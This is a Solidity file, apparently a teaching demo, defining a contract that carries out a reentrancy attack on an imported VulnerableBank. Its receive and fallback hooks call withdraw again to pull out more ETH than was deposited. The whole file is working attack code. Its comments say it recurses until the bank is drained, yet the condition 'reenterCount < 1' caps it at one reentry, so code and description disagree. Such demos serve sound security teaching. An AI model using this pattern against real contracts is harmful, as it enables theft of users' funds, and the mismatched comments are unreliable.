// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {VulnerableBank} from "./VulnerableBank.sol";

/**
 * @title ReentrancyAttacker
 * @notice 重入攻击演示用的攻击合约。
 * @dev 通过 fallback/receive 在收到 ETH 时递归调用受害者的 withdraw，直至将其资金耗尽或无法继续。
 */
contract ReentrancyAttacker {
    /// @notice 目标银行合约
    VulnerableBank public immutable bank;

    /// @notice 攻击开关：仅在攻击期间允许重入逻辑
    bool private attacking;
    /// @notice 记录重入层数/次数
    uint256 public reenterCount;

    /// @notice 攻击开始事件
    event AttackStarted(address indexed attacker, uint256 initialDeposit, uint256 bankBalanceBefore);
    /// @notice 攻击回调事件（每次重入触发）
    event AttackReentered(uint256 indexed depth, uint256 received, uint256 bankBalance, uint256 attackerRecordedBalance);
    /// @notice 攻击结束事件
    event AttackCompleted(uint256 totalReentered, uint256 bankBalanceAfter, uint256 attackerEthBalance);

    /// @notice 自定义错误：无效目标
    error InvalidTarget();

    /**
     * @param _bank 受害者银行合约地址
     */
    constructor(address _bank) {
        if (_bank == address(0)) revert InvalidTarget();
        bank = VulnerableBank(_bank);
    }

    /**
     * @notice 启动重入攻击
     * @dev 向银行先存入一笔资金，然后调用一次 withdraw 触发回调链。
     */
    function attack() external payable {
        require(msg.value > 0, "NO_VALUE");

        uint256 beforeBank = address(bank).balance;
        emit AttackStarted(msg.sender, msg.value, beforeBank);

        // 先在受害者合约中记一笔余额
        bank.deposit{value: msg.value}();

        // 打开攻击开关，并以同额触发首次提款
        attacking = true;
        reenterCount = 0;
        bank.withdraw(msg.value);
        attacking = false;

        emit AttackCompleted(reenterCount, address(bank).balance, address(this).balance);
    }

    /**
     * @notice 接收 ETH 时的回调，进行递归重入
     * @dev 只在攻击进行中生效，以避免意外重入。
     */
    fallback() external payable {
        _onReceive(msg.value);
    }

    /**
     * @notice 接收 ETH 时的回调，进行递归重入
     */
    receive() external payable {
        _onReceive(msg.value);
    }

    function _onReceive(uint256 received) internal {
        if (!attacking) return;

        uint256 bankBal = address(bank).balance;
        uint256 attackerRecorded = bank.balances(address(this));

        emit AttackReentered(reenterCount, received, bankBal, attackerRecorded);
        reenterCount += 1;

        // 继续以相同额度重入，直到银行无法再转出该金额
        if (reenterCount < 1 && bankBal >= received && attackerRecorded >= received) {
            bank.withdraw(received);
        }
    }

    /**
     * @notice 攻击合约当前持有的 ETH 余额
     */
    function attackerBalance() external view returns (uint256 bal) {
        return address(this).balance;
    }
}
